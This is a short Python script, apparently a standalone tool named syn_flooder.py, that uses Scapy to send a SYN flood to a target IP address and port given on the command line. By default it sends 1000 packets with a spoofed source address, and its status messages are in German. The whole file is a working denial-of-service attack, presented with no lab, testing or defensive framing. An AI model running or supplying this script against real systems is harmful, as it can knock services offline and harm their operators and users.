from scapy.layers.inet import TCP
from scapy.layers.inet import IP
from scapy.all import *
import random
import sys

print("hello")
def send_syn_flood(target_ip, target_port, count=1000):
    print(f"[+] Starte SYN-Flood auf {target_ip}:{target_port}")
    for i in range(count):
        src_port = random.randint(1024, 65535)
        ip = IP(src="127.0.0.1", dst=target_ip)
        tcp = TCP(sport=src_port, dport=target_port, flags="S", seq=random.randint(0, 4294967295))
        paket = ip / tcp
        send(paket)
        if i % 100 == 0:
            print(f"[+] Gesendet: {i} Pakete")
    print("[✓] Angriff abgeschlossen.")


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: sudo python3 syn_flooder.py <TARGET_IP> <PORT>")
        sys.exit(1)
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    send_syn_flood(target_ip, target_port)